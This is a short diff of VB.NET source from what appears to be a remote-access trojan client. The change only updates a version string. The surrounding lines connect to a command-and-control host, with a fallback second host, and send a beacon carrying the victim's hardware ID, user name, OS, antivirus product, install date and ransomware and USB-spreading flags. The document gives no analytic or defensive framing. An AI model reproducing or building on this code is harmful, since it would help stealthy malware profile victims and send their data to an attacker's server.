@@ -84,7 +84,7 @@ e:      ' clear things and ReConnect
             lp = 0
             C.Client.Connect(MainHOST, Settings.PORT)
             CN = True
-            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.1E" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
+            Send("info" & KEY & ID.HWID & KEY & ID.UserName & KEY & IO.Path.GetFileName(Application.ExecutablePath) & KEY & "v0.4.2A" & KEY & ID.MyOS & " " & ID.Bit & KEY & ID.INDATE & KEY & ID.AV & KEY & ID.Ransomeware & KEY & ID.USBSP & KEY & " ")
         Catch ex As Exception
             If MainHOST = Settings.HOST1 Then
                 MainHOST = Settings.HOST2
